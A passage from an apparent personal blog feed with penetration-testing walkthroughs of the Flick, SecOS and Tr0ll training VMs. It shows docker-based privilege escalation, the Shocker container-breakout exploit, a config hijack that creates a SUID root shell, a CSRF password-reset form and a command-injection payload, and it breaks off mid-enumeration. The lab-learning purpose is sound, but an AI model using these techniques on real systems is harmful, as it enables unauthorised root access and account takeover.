<p>Woohoo! It worked! With this we can SSH as robin. I copied the key contents to my machine (don&rsquo;t forget to <em>chmod 600</em>, or you will get an Unprotected Private Key File eror), and logged in as robin.</p>

<p>After a bit of enumeration, I didn&rsquo;t find anything extremely interesting. User robin is able to sudo the following:</p>

<p>``` plain
robin@flick:/opt/start_apache$ sudo -l
Matching Defaults entries for robin on this host:</p>

<pre><code>env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User robin may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /opt/start_apache/restart.sh
</code></pre>

<p>```</p>

<p>I couldn&rsquo;t read the files in that directory (there is an additional file called <em>start.py</em>), because I got a permission denied error. With nothing else to follow, perhaps there is more to be gained from the Docker program. The official documentation for Docker <a href="https://docs.docker.com/reference/commandline/cli/">commands</a> came in handy.</p>

<p>First, I listed all the available containers, and found something:</p>

<p><code>plain
robin@flick:/opt/start_apache$ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES
b0f71c63a88c        ubuntu:14.04        /bin/bash           7 months ago        Exited (0) 7 months ago                       sharp_shockley  
</code></p>

<p>It&rsquo;s possible to set up a console session with the container (check the help for the run command to see all the kinds of things you can do with it):</p>

<p><code>plain
robin@flick:/opt/start_apache$ docker run -i -t ubuntu
root@4dfeb7b4ed8c:/# whoami
root
</code></p>

<p>Breaking up the command:</p>

<ul>
<li>Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG&hellip;]</li>
</ul>


<p>Run a command in a new container</p>

<ul>
<li><p>-i, &mdash;interactive=false: Keep stdin open even if not attached</p></li>
<li><p>-t, &mdash;tty=false: Allocate a pseudo-tty</p></li>
</ul>


<p>But even if we can run as root inside the container, it doesn&rsquo;t solve the problem of getting root outside it. However, I looked more closely at the options for <em>run</em> and I noticed this:</p>

<p><code>plain
-v, --volume=[]: Bind mount a volume (e.g. from the host: -v /host:/container, from docker: -v /container)
</code></p>

<p>Reading the <a href="https://docs.docker.com/userguide/dockervolumes/">documentation</a>, it seems it&rsquo;s possible to mount a volume from the host?! Let&rsquo;s see:</p>

<p><code>plain
docker run -i -t -v /root/:/root/ ubuntu
root@4340d77a56d3:/# ls /root/
53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc  flag.txt
</code></p>

<p>Success! If you can&rsquo;t get root on the box, bring the box to where you are root! :D</p>

<p>The obvious flag is just a decoy:</p>

<p><code>plain
root@4340d77a56d3:/# cat /root/flag.txt
Errr, you are close, but this is not the flag you are looking for.
</code></p>

<p>Of course, the real flag is cleverly hidden inside the directory with a name that screams for attention:</p>

<p>``` plain
root@4340d77a56d3:/# ls /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
real_flag.txt
root@4340d77a56d3:/# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt
Congrats!</p>

<p>You have completed &lsquo;flick&rsquo;! I hope you have enjoyed doing it as much as I did creating it :)</p>

<p>ciao for now!
@leonjza
```</p>

<h3>Bonus &ndash; get root command execution on host</h3>

<p>Ok, after an overly lengthy break, I returned to the bonus part of the challenge. I will use an alternate way for this instead of proceeding from where I left off.</p>

<p>Remember the files in <em>/opt/</em> that I couldn&rsquo;t read? Naturally, I was curious about them, and they provide an alternate path to exploitation. And the fact that the Docker version on the box is out of date.. :D</p>

<p>During my initial enumeration, I didn&rsquo;t pay much attention to the fact that Docker is outdated, as can be seen from the following:</p>

<p><code>plain
robin@flick:~$ docker version
Client version: 0.11.0
Client API version: 1.11
Go version (client): go1.2.1
Git commit (client): 15209c3
Server version: 0.11.0
Server API version: 1.11
Git commit (server): 15209c3
Go version (server): go1.2.1
Last stable version: 1.5.0, please update docker
</code></p>

<p>So..maybe there is some nice exploit that can assist us? It turns there is! And it&rsquo;s called <a href="https://github.com/gabrtv/shocker">Shocker</a></p>

<p>A good description of this container-breakout exploit, along with code, can be found <a href="http://stealth.openwall.net/xSports/shocker.c">here</a>. I will quote the gist of it:</p>

<blockquote><p>Demonstrates that any given docker image someone is asking
you to run in your docker setup can access ANY file on your host,
e.g. dumping hosts /etc/shadow or other sensitive info, compromising
security of the host and any other docker VM&rsquo;s on it.</p></blockquote>

<p>I could of course read <em>/etc/shadow</em> or the flags, but I&rsquo;m interested in the <em>/opt/start_apache/</em> files. To read them, you have to modify the code here:</p>

<p>``` c
if (find_handle(fd1, &ldquo;/etc/shadow&rdquo;, &amp;root_h, &amp;h) &lt;= 0)</p>

<pre><code>die("[-] Cannot find valid handle!");
</code></pre>

<p>```</p>

<p>Just insert the path to the file you want to read instead of <em>etc/shadow</em>. So we want <em>/opt/start_apache/restart.sh</em> and <em>/opt/start_apache/start.py</em>. To run the PoC exploit, use the command <code>docker run gabrtv/shocker</code>. To modify source and rebuild, use <code>docker build -t gabrtv/shocker .</code>. I got an error saying that no Dockerfile was found in the current directory, so I just pulled the one from Github and it worked. To compile the exploit (on the Flick box), use the command found in the Dockerfile on Github:</p>

<p><code>plain
cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</code></p>

<p>After rebuilding, I ran the exploit and:</p>

<p>``` plain
robin@flick:~$ docker run gabrtv/shocker
[<strong><em>] docker VMM-container breakout Po&copy; 2014             [</em></strong>]
[<strong><em>] The tea from the 90&rsquo;s kicks your sekurity again.     [</em></strong>]
[<strong><em>] If you have pending sec consulting, I&rsquo;ll happily     [</em></strong>]
[<strong><em>] forward to my friends who drink secury-tea too!      [</em></strong>]</p>

<p><enter>
[<em>] Resolving &lsquo;opt/start_apache/restart.sh&rsquo;
[</em>] Found .
[<em>] Found mnt
[</em>] Found home
[<em>] Found root
[</em>] Found lost+found
[<em>] Found media
[</em>] Found selinux
[<em>] Found boot
[</em>] Found srv
[<em>] Found lib
[</em>] Found dev
[<em>] Found proc
[</em>] Found bin
[<em>] Found lib64
[</em>] Found etc
[<em>] Found ..
[</em>] Found var
[<em>] Found sbin
[</em>] Found sys
[<em>] Found opt
[+] Match: opt ino=246
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (opt) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;start_apache/restart.sh&rsquo;
[</em>] Found .
[<em>] Found ..
[</em>] Found start_apache
[+] Match: start_apache ino=137500
[<em>] Brute forcing remaining 32bit. This can take a while&hellip;
[</em>] (start_apache) Trying: 0x00000000
[<em>] #=8, 1, char nh[] = {0x1c, 0x19, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[</em>] Resolving &lsquo;restart.sh&rsquo;
[<em>] Found .
[</em>] Found start.py
[<em>] Found ..
[</em>] Found restart.sh
[+] Match: restart.sh ino=173642
[<em>] Brute forcing remaining 32bit. This can take a while&hellip;
[</em>] (restart.sh) Trying: 0x00000000
[<em>] #=8, 1, char nh[] = {0x4a, 0xa6, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[</em>] #=8, 1, char nh[] = {0x4a, 0xa6, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:</p>

<h1>!/bin/sh</h1>

<p>/usr/sbin/service apache2 restart
/usr/bin/supervisorctl restart all
```</p>

<p>I was too lazy to modify the print statement, the actual file that was read was the <em>restart.sh</em> file. Not very interesting, so I looked at the other one (this time I&rsquo;m only showing the code):</p>

<p>``` python</p>

<h1>!/usr/bin/python</h1>

<p>&lsquo;&rsquo;'</p>

<pre><code>Simple socket server using threads. Used in the flick CTF
Credit: http://www.binarytides.com/python-socket-server-code-example/
</code></pre>

<p>&lsquo;&rsquo;'</p>

<p>import socket
import os, sys, signal
from thread import *
import subprocess</p>

<h1>import the directory containing our config, and prevent the bytcode writes</h1>

<p>sys.dont_write_bytecode = True</p>

<h1>see if /tmp has a configuration to load.</h1>

<h1>Debugging purposes only!!!</h1>

<p>if os.path.isfile(&lsquo;/tmp/config.py&rsquo;):</p>

<pre><code>sys.path.insert(0, '/tmp')
</code></pre>

<p>else:</p>

<pre><code>sys.path.insert(0, '/etc')
</code></pre>

<h1>import the config</h1>

<p>from config import config</p>

<p>HOST = &lsquo;&rsquo;   # Symbolic name meaning all available interfaces
PORT = 8881 # Arbitrary non-privileged port</p>

<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</p>

<h1>Bind socket to local host and port</h1>

<p>try:</p>

<pre><code>s.bind((HOST, PORT))
</code></pre>

<p>except socket.error as msg:</p>

<pre><code>print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
sys.exit()
</code></pre>

<h1>Start listening on socket</h1>

<p>s.listen(10)</p>

<h1>Function for handling connections. This will be used to create threads</h1>

<p>def clientthread(conn):</p>

<pre><code>#Sending message to connected client
conn.send('Welcome to the admin server. A correct password will \'flick\' the switch and open a new door:\n&gt; ') #send only takes string

#infinite loop so that function do not terminate and thread do not end.
while True:

    #Receiving from client
    data = conn.recv(1024)
    reply = 'OK: ' + data
    if not data: 
        break

# check if the password is tabupJievas8Knoj
if data.strip() == 'tabupJievas8Knoj':
    return_code = subprocess.call(config['command'], shell=True)  
    if return_code == 0:
        reply += '\nAccepted! The door should be open now :poolparty:\n'
    else:
        reply += '\nAccepted, but it doesn\'t look like the door opened :&lt;\n'

# add the prompt again
reply += '\n&gt; '

    conn.sendall(reply)
#came out of loop
conn.close()
</code></pre>

<h1>now keep talking with the client</h1>

<p>while 1:</p>

<pre><code>#wait to accept a connection - blocking call
conn, addr = s.accept()

#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
start_new_thread(clientthread ,(conn,))
</code></pre>

<p>s.close()
```</p>

<p>So this is the application that provided us with the first foothold on the box! The interesting part is that the program looks for a <em>config.py</em> in <em>/tmp/</em>, and if it can&rsquo;t find one there it loads it from <em>/etc/</em>. Let&rsquo;s see it:</p>

<p>``` plain
robin@flick:~$ cat /etc/config.py
config = {</p>

<pre><code>'command': 'service apache2 restart'
</code></pre>

<p>}
```</p>

<p>So it runs a command?..This is great, because we can hijack it by creating a config file in <em>/tmp/</em> with code of our choosing:</p>

<p>``` plain
robin@flick:~$ cat > /tmp/config.py
config = {</p>

<pre><code>    'command': 'cp /bin/sh /tmp/pwn; chmod 4777 /tmp/pwn'
</code></pre>

<p>}
```</p>

<p>Copied the shell and gave it SUID and full access so we can execute it as root. Next we have to restart the program:</p>

<p>``` plain
obin@flick:~$ sudo /opt/start_apache/restart.sh
 * Restarting web server apache2                                                                                                                     apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName
apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName</p>

<pre><code>                                                                                                                                          [ OK ]
</code></pre>

<p>start_apache-8000: stopped
start_apache-8000: started
```</p>

<p>I looked in <em>/tmp/</em> but the shell wasn&rsquo;t there, so I tried again to connect to port 8881 and give the password. And indeed, now there is a shell waiting there:</p>

<p><code>plain
robin@flick:~$ ls -l /tmp/
total 112
-rw-rw-r-- 1 robin robin     75 Apr  1 14:08 config.py
-rwsrwxrwx 1 root  root  109768 Apr  1 14:17 pwn
</code></p>

<p>Game over!</p>

<p>``` plain
robin@flick:~$ /tmp/pwn</p>

<h1>whoami</h1>

<p>root
```</p>

<blockquote><p>You will be run over by a beer truck.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - SecOS]]></title>
    <link href="http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos/"/>
    <updated>2015-02-04T13:36:51+02:00</updated>
    <id>http://chousensha.github.io/blog/2015/02/04/pentest-lab-secos</id>
    <content type="html"><![CDATA[<p>SecOS is a web based VM created by PaulSec. Here is the briefing:</p>

<blockquote><p>Not too tired after BSides London? Still want to solve challenges? Here is the VM I told about during my talk where you&rsquo;ll have to practice some of
your skills to retrieve the precious flag located here: /root/flag.txt. This VM is an entry-level boot2root and is web based.</p></blockquote>

<!-- more -->


<p>The beginning should be familiar by now&hellip;</p>

<p>``` plain
nmap -A -p1-65535 192.168.80.128</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-02-04 13:36 EET
Nmap scan report for 192.168.80.128
Host is up (0.00085s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     (protocol 2.0)
| ssh-hostkey:
|   1024 9b:d9:32:f5:1d:19:88:d3:e7:af:f0:4e:21:76:7a:c8 (DSA)
|   2048 90:b0:3d:99:ed:5b:1b:e1:d4:e6:b5:dd:e9:70:89:f5 (RSA)
|<em>  256 78:2a:d9:e3:63:83:24:dc:2a:d4:f6:4a:ac:2c:70:5a (ECDSA)
8081/tcp open  http    Node.js (Express middleware)
|</em>http-title: Secure Web App
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port22-TCP:V=6.47%I=7%D=2/4%Time=54D20435%P=x86_64-unknown-linux-gnu%r(
SF:NULL,27,&ldquo;SSH-2.0-OpenSSH_6.6p1\x20Ubuntu-2ubuntu1\r\n&rdquo;);
MAC Address: 00:0C:29:F4:5D:DC (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 &ndash; 3.14
```</p>

<p>Let&rsquo;s see what&rsquo;s running on port 8081:</p>

<p><img class="center" src="/images/pentest/secos/site.png" title="&lsquo;secos site&rsquo; &lsquo;site&rsquo;" ></p>

<p>Looking at the about page, we can see the site is really secure!</p>

<p><img class="center" src="/images/pentest/secos/about.png" title="&lsquo;secos about&rsquo; &lsquo;about&rsquo;" ></p>

<p>Also, there is some sort of hint in the source code:</p>

<p>``` html</p>

<!--<li><a href="http://chousensha.github.io/hint">Wanna help?</a></li>!-->


<p>```</p>

<p>Checking that page, there is this message:</p>

<p><img class="center" src="/images/pentest/secos/doh.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>

<p>Well, there is something to see in the source code:</p>

<p>``` html</p>

<!--
        First: the admin visits the website (really) frequently
        Second: He runs it locally, on 127.0.0.1. 
        Third: CSRF and /(http:\/\/[-\/\.\w:0-9\?&]+)/gi, I think that's enough
        !-->


<p>```</p>

<p>I created a user to check the functionality of the app. It seems you can send and receive messages between users. The spiderman user is the admin, so we&rsquo;re mainly interested in that account. Using the hint, the likely course seems to be crafting a CSRF request to change the admin&rsquo;s password and sending it to him in a message.</p>

<p>First, a HTML form that will take care of resetting the password:</p>

<p>``` html
<html>
<body>
<form name="changepass" method="post" action="http://127.0.0.1:8081/change-password">
<input type="hidden" name="username" value="spiderman">
<input type="hidden" name="password" value="pwned">
</form></p>

<script type="text/javascript">
document.changepass.submit();
</script>


<p></body>
</html>
```</p>

<p>Breaking it up, the form submits the username and password (which are hidden because we are using Javascript to send them to the server, and not clicking buttons ourselves) to the change password page. Because of the hint we found in the source code, we are using the localhost address instead of the machine&rsquo;s IP. I copied it to <code>/var/www/</code> and served it with apache.</p>

<p>And now to send a message to spiderman, with a URL for him to click:</p>

<p><img class="center" src="/images/pentest/secos/sendcsrf.png" title="&lsquo;sendcsrf&rsquo; &lsquo;sendcsrf&rsquo;" ></p>

<p>Success! His password was reset and we can log in with the new password that we&rsquo;ve just set. In the Messages section, we see that another user also had less than honorable intentions:</p>

<p><img class="center" src="/images/pentest/secos/pirate.png" title="&lsquo;pirate&rsquo; &lsquo;pirate&rsquo;" ></p>

<p>Next thing I did was try to SSH into the box as spiderman, with the password <em>CrazyPassword!</em>. And it worked! In spiderman&rsquo;s home directory, there is a folder called <em>vnwa</em>..a vulnerable web application maybe? I found something potentially interesting buried in the <em>internalServer.js</em> code:</p>

<p>``` plain
spiderman@SecOS-1:~/vnwa$ cat internalServer.js
var fs = require(&lsquo;fs&rsquo;);
var express = require(&lsquo;express&rsquo;);
var http = require(&lsquo;http&rsquo;);
var sys = require(&lsquo;sys&rsquo;)
var exec = require(&lsquo;child_process&rsquo;).exec;
var crypto = require(&lsquo;crypto&rsquo;);</p>

<p>var utils = require(&lsquo;./lib/utils.js&rsquo;);
var model = require(&lsquo;./lib/model.js&rsquo;);</p>

<p>var app = express();
var server = http.createServer(app);</p>

<p>var logger = function (req, res, next) {</p>

<pre><code>console.log(req.connection.remoteAddress + " tried to access : " + req.url);
next(); // Passing the request to the next handler in the stack.
</code></pre>

<p>}</p>

<p>// Configuration
app.configure(function () {</p>

<pre><code>// Session management
app.use(express.cookieParser());
app.use(express.session({secret: 'privateKeyForSession'}));
app.use("/js", express.static(__dirname + '/public/js')); // javascript folder
app.use("/css", express.static(__dirname + '/public/css')); // javascript folder

app.set('views', __dirname + '/views'); // views folder
app.set('view engine', 'ejs'); // view engine for this projet : ejs 

app.use(express.bodyParser()); // for POST Requests
app.use(logger); // Here you add your logger to the stack.
app.use(app.router); // The Express routes handler.
</code></pre>

<p>});</p>

<p>app.get(&lsquo;/&rsquo;, function (req, res) {</p>

<pre><code>res.render('ping.ejs', {
    isConnected: req.session.isConnected,
    isAdmin: req.session.isAdmin
});
</code></pre>

<p>});</p>

<p>// Update password
app.post(&lsquo;/&rsquo;, function (req, res) {</p>

<pre><code>ip = req.body.ip
if (ip == "") {
    utils.redirect(req, res, '/ping-status');
} else {
    // getting the command with req.params.command
    var child;
    // console.log(req.params.command);
    child = exec('ping ' + ip, function (error, stdout, stderr) {
        res.render('ping.ejs', {
            isConnected: req.session.isConnected,
            message: stdout,
            isAdmin: req.session.isAdmin
        });
    });
}
</code></pre>

<p>});</p>

<p>server.listen(9000, &lsquo;127.0.0.1&rsquo;, function() {
  console.log(&ldquo;Listening on port 9000&rdquo;);
});
```</p>

<p>Indeed, this app is listening on port 9000:</p>

<p><code>plain
spiderman@SecOS-1:~/vnwa/scripts$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -               
...
</code></p>

<p>By looking at the code, it seems it&rsquo;s a pinging app. During the enumeration phase, I also noticed that unlike the web server we&rsquo;ve exploited, this internal server is run by root:</p>

<p><code>plain
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
root       186  0.0  0.1   4692   960 ?        Ss   11:40   0:00 sudo -u spiderman sh -c /usr/local/bin/node /home/spiderman/vnwa/server.js
root       188  0.0  0.1   4692   956 ?        Ss   11:40   0:00 sudo -u root sh -c /usr/local/bin/node /home/spiderman/vnwa/internalServer.js
...
</code></p>

<p>To access this application, I set up a SSH tunnel. On my machine, I ran this command:</p>

<p><code>plain
ssh -f -N -L 4444:127.0.0.1:9000 -l spiderman 192.168.80.128
</code></p>

<p>This allowed me to connect to the remote application on port 9000 from the browser of my Kali machine. Let me break it up:</p>

<ul>
<li><p><strong>-f</strong> Requests ssh to go to background just before command execution. This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.</p></li>
<li><p><strong>-N</strong> Do not execute a remote command.  This is useful for just forwarding ports.</p></li>
<li><p><strong>-L</strong> [bind_address:]port:host:hostport</p></li>
</ul>


<p>Specifies that the given port on the local (client) host is to be
forwarded to the given host and port on the remote side.  This
works by allocating a socket to listen to <strong>port</strong> on the local side,
optionally bound to the specified <strong>bind_address</strong>.  Whenever a connection is made to this port, the connection is forwarded over
the secure channel, and a connection is made to <strong>host</strong> port
<strong>hostport</strong> from the remote machine.</p>

<ul>
<li><p><strong>-l</strong> Specifies the user to log in as on the remote machine.</p></li>
<li><p><strong>192.168.80.128</strong> The IP address of the SecOS box</p></li>
</ul>


<p>What this did was forwarding the connections to port 4444 on my local machine to the remote server on port 9000. Remember that the application is only listening on the localhost interface on the SecOS box. So, the SecOS machine is acting as a sort of gateway, tunneling the connections I point to my 4444 port to the 9000 port on localhost. You can read some more about how this works on <a href="http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels">http://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels</a></p>

<p>Now, in my browser, I went to <a href="http://127.0.0.1:4444/">http://127.0.0.1:4444/</a> and:</p>

<p><img class="center" src="/images/pentest/secos/ping.png" title="&lsquo;ping&rsquo; &lsquo;ping&rsquo;" ></p>

<p>I tried pinging my Kali machine to see if it works but it just appeared to hang. So I tried limiting the amount of pings by entering <code>-c 2</code> after the IP to be pinged. And it worked!</p>

<p><img class="center" src="/images/pentest/secos/pingres.png" title="&lsquo;ping result&rsquo; &lsquo;ping result&rsquo;" ></p>

<p>We know the ping app is running as root, so if we can do remote code execution, we&rsquo;ll be able to run commands as root. And the application is vulnerable to just what we need! Remember these lines from the internal server code:</p>

<p><code>javascript
ip = req.body.ip
child = exec('ping ' + ip, function (error, stdout, stderr)
</code></p>

<p>The <em>ip</em> variable is passed to the <em>exec</em> function without any prior input sanitization. So, we just close the first command (which would be the ping), and insert an additional command of our choosing, which in this case will be to read the flag:</p>

<p><code>plain
;cat /root/flag.txt
</code></p>

<p>And profit!</p>

<p><img class="center" src="/images/pentest/secos/win.png" title="&lsquo;flag&rsquo; &lsquo;flag&rsquo;" ></p>

<blockquote><p>Don&rsquo;t tell any big lies today.  Small ones can be just as effective.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Tr0ll]]></title>
    <link href="http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll/"/>
    <updated>2014-11-30T08:48:14+02:00</updated>
    <id>http://chousensha.github.io/blog/2014/11/30/pentest-lab-tr0ll</id>
    <content type="html"><![CDATA[<p>Next in my lab series will be another machine from VulnHub:</p>

<blockquote><p>Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.</p>

<p>The goal is simple, gain root and get Proof.txt from the /root directory.</p>

<p>Not for the easily frustrated! Fair warning, there be trolls ahead!</p></blockquote>

<!-- more -->


<p>As always, I start with a guns blazing Nmap scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.80.134</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-30 08:55 EET
Nmap scan report for 192.168.80.134
Host is up (0.00086s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|<em>-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap [NSE: writeable]
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|</em>  256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|<em>/secret
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
SF-Port22-TCP:V=6.47%I=7%D=11/30%Time=547ABF60%P=x86_64-unknown-linux-gnu%
SF:r(NULL,29,&ldquo;SSH-2.0-OpenSSH_6.6.1p1\x20Ubuntu-2ubuntu2\r\n&rdquo;);
MAC Address: 00:0C:29:F8:CC:3D (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 &ndash; 3.14
Network Distance: 1 hop
Service Info: OS: Unix</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 192.168.80.134</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
```</p>

<p>Not an awful lot to start with. First thing, I checked what&rsquo;s being served on port 80, and of course, there was a troll:</p>

<p><img class="center" src="/images/pentest/tr0ll/troll1.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>

<p>The &ldquo;secret&rdquo; doesn&rsquo;t help much either, other than potentially hinting at the use of steganography, which I am very bad at.</p>

<p><img class="center" src="/images/pentest/tr0ll/troll2.png" title="&lsquo;troll2&rsquo; &lsquo;troll2&rsquo;" ></p>

<p>I also searched for a vsftpd exploit suitable to the 3.0.2 version, which I couldn&rsquo;t find. So before trying to search for hidden data that might not even exist inside the images, and even if it does, I wouldn&rsquo;t be able to find it anyway, I&rsquo;m going to see if there is anything interesting lying around the FTP server.</p>

<p>Logging in with the <em>anonymous/anonymous</em> credentials, I see there is a pcap file waiting:</p>

<p><code>plain
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 09 23:43 lol.pcap
226 Directory send OK.
</code></p>

<p>I downloaded it to my machine so I can check it out with Wireshark:</p>

<p><code>plain
ftp&gt; get lol.pcap
local: lol.pcap remote: lol.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
226 Transfer complete.
8068 bytes received in 0.05 secs (148.1 kB/s)
</code></p>

<p>Scanning through the packets I noticed something interesting:</p>

<p><img class="center" src="/images/pentest/tr0ll/wireshark.png" title="&lsquo;secret stuff&rsquo; &lsquo;secret stuff&rsquo;" ></p>

<p>And when following the stream, even more interesting tidbits:</p>

<p><img class="center" src="/images/pentest/tr0ll/stream.png" title="&lsquo;TCP stream&rsquo; &lsquo;tcp stream&rsquo;" ></p>

<p>So why don&rsquo;t we see the secret stuff for ourselves! In order to see what&rsquo;s inside the secret file, I looked at the FTP-DATA packet that comes after requesting the transfer. I highlighted it below and you can see it&rsquo;s the correct size (147 bytes):</p>

<p><img class="center" src="/images/pentest/tr0ll/ftpdata.png" title="&lsquo;ftp data&rsquo; &lsquo;ftp data&rsquo;" ></p>

<p>If you follow the stream you will see this:</p>

<p>``` plain
Well, well, well, aren&rsquo;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</p>

<p>Sucks, you were so close&hellip; gotta TRY HARDER!
```</p>

<p>Finally, some progress! As an aside, this information could also be obtained just by running <em>strings</em> on the pcap file. Now let&rsquo;s go back to the browser and see what&rsquo;s inside that directory. To keep up with the troll theme, there&rsquo;s a BIN file named roflmao. Again I felt a little discouraged because I have only a rudimentary grasp of binary analysis and reverse engineering at the moment. Running <em>strings</em> on it, the only interesting thing I noticed was this line:</p>

<p><code>plain
Find address 0x0856BF to proceed
</code></p>

<p>If you run it (make it executable or you will get a permission denied error), you will see that it only prints the above line and exits. Time for GDB!</p>

<p><code>plain
Dump of assembler code for function main:
   0x0804841d &lt;+0&gt;: push   ebp
   0x0804841e &lt;+1&gt;: mov    ebp,esp
   0x08048420 &lt;+3&gt;: and    esp,0xfffffff0
   0x08048423 &lt;+6&gt;: sub    esp,0x10
   0x08048426 &lt;+9&gt;: mov    DWORD PTR [esp],0x80484d0
   0x0804842d &lt;+16&gt;:    call   0x80482f0 &lt;printf@plt&gt;
   0x08048432 &lt;+21&gt;:    leave  
   0x08048433 &lt;+22&gt;:    ret   
</code></p>

<p>I looked around as much as I could, but the program is a really small one and I could find nothing hidden. Also the address didn&rsquo;t seem to fit in with any of the memory addresses inside the binary, so I thought maybe it&rsquo;s just a hint for continuing elsewhere. The only place that came to mind was to try for another hidden directory on the web server:</p>

<p><img class="center" src="/images/pentest/tr0ll/0856bf.png" title="&lsquo;hidden&rsquo; &lsquo;win&rsquo;" ></p>

<p>Woohoo! We&rsquo;re on the right track. Now it seems both directories contain a text file with..users and a password?</p>

<p><img class="center" src="/images/pentest/tr0ll/which_one.png" title="&lsquo;passwords&rsquo; &lsquo;which pass&rsquo;" ></p>

<p><img class="center" src="/images/pentest/tr0ll/gj.png" title="&lsquo;good job&rsquo; &lsquo;gj&rsquo;" ></p>

<p>I tried connecting to SSH using the password in the Pass.txt files and usernames from the other file. Then I also tried to connect as root, troll, tr0ll, using everything in the lists as password. Manually.. Anyway, when nothing worked, I had to take a break and think that it&rsquo;s most likely trolling me, as it did in all the previous steps. So, looking at the directory index, it&rsquo;s apparent that one folder contains the password and the other one a list with potential usernames, from which you have to find the correct one to go with the password. But since I&rsquo;ve already tried that and failed, I didn&rsquo;t know what else to do. Now, the Pass.txt file contained a good job message that seemed to be the actual password, but maybe it was just a normal good job..implying that I already found the password. So I tried SSH again, this time using Pass as password..and when that didn&rsquo;t work, even which_one_lol. This was more wasted effort, so lastly, I literally used the name of the file as password: Pass.txt. And! Combining it with the overflow user&hellip;success!! Now I started looking around, but before I could find anything, I&rsquo;ve been booted by the shell?!</p>

<p>``` plain
Broadcast Message from root@trol</p>

<pre><code>    (somewhere) at 5:45 ...                                                
</code></pre>

<p>TIMES UP LOL!</p>

<p>Connection to 192.168.80.134 closed by remote host.
Connection to 192.168.80.134 closed.
```</p>

<p>After more logins, it appears the shell is killed every few minutes. So, this troll might be playing with cron. The only other lead I had so far was a file named <em>lmao.py</em> in the <code>/opt/</code>, but I didn&rsquo;t have permission to read it. I took a look in the <code>/var/log</code> directory:</p>

<p><code>plain
$ ls /var/log
alternatives.log    cronlog   fail2ban.log    udev
